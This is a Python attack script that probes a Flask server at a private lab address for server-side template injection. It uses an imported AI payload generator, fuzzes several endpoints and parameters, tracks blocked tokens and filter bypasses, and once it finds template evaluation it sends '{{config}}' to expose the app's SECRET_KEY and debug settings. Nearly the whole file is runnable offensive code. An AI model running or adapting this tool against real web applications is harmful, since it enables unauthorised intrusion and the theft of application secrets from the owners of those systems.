#!/usr/bin/env python3
import asyncio
import requests
from app.core.ai_payload_engine import AIPayloadEngine, ResponseType

async def live_ai_ssti_test():
    """Live test of AI SSTI against Flask target"""
    target_url = "http://10.10.11.62:5000"
    
    # Create session
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Initialize AI engine
    ai_engine = AIPayloadEngine()
    
    print("AI-Driven SSTI Live Test")
    print("="*40)
    print(f"Target: {target_url}")
    
    # Test endpoints
    test_endpoints = [
        f"{target_url}/",
        f"{target_url}/search",
        f"{target_url}/execute"
    ]
    
    # Test parameters
    test_params = ['q', 'search', 'code', 'input', 'data']
    
    for endpoint in test_endpoints:
        print(f"\nTesting endpoint: {endpoint}")
        
        for param in test_params:
            print(f"  Parameter: {param}")
            
            # Generate initial payloads
            payloads = ai_engine.generate_adaptive_payloads(target_url, 'python_class_access')
            
            for payload in payloads[:3]:  # Test first 3 payloads
                try:
                    # Test GET request
                    response = session.get(endpoint, params={param: payload}, timeout=5)
                    
                    response_data = {
                        'status_code': response.status_code,
                        'content': response.text,
                        'headers': dict(response.headers)
                    }
                    
                    # Classify response
                    result_type, next_payload = ai_engine.process_response_and_adapt(
                        target_url, payload, response_data
                    )
                    
                    print(f"    Payload: {payload}")
                    print(f"    Status: {response.status_code}")
                    print(f"    Classification: {result_type.value}")
                    print(f"    Content length: {len(response.text)}")
                    
                    # Check for evaluation
                    if result_type == ResponseType.EVALUATED:
                        print(f"    SUCCESS: Template evaluation detected!")
                        print(f"    Response snippet: {response.text[:100]}...")
                        
                        # Try command execution
                        cmd_payload = "{{config}}"
                        cmd_response = session.get(endpoint, params={param: cmd_payload}, timeout=5)
                        if 'SECRET_KEY' in cmd_response.text or 'DEBUG' in cmd_response.text:
                            print(f"    CRITICAL: Flask config exposed!")
                        
                        return True
                    
                    if next_payload and next_payload != payload:
                        print(f"    Next adaptation: {next_payload[:50]}...")
                    
                    print()
                    
                except Exception as e:
                    print(f"    Error: {str(e)}")
                    continue
    
    # Show final intelligence
    intelligence = ai_engine.get_target_intelligence(target_url)
    print(f"\nFinal Target Intelligence:")
    print(f"  Blocked tokens: {intelligence['blocked_tokens']}")
    print(f"  Working bypasses: {len(intelligence['working_bypasses'])}")
    print(f"  Recommended approach: {intelligence['recommended_approach']}")
    
    return False

if __name__ == "__main__":
    result = asyncio.run(live_ai_ssti_test())
    if result:
        print("\nSSTI vulnerability confirmed!")
    else:
        print("\nNo SSTI vulnerabilities detected.")